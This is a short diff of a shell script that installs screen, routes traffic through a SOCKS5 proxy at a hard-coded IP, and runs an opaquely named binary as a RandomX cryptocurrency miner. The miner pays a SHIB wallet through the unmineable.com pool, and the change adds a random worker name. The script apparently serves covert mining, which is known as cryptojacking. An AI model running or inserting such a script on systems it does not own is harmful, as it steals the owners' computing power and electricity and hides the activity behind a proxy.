@@ -1,4 +1,4 @@
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)
 apt-get update
 apt install screen -y
-export http_proxy=socks5://98.162.25.23:4145 && chmod u+x 2 && ./2 -o rx-us.unmineable.com:13333 -u SHIB:0x7c010aa62bc975b07cce8a84abca304f1d23a4f9 -p x -k -a rx/0
+export http_proxy=socks5://98.162.25.23:4145 && chmod u+x 2 && ./2 -o rx-us.unmineable.com:13333 -u SHIB:0x7c010aa62bc975b07cce8a84abca304f1d23a4f9.$WORKER -p x -k -a rx/0
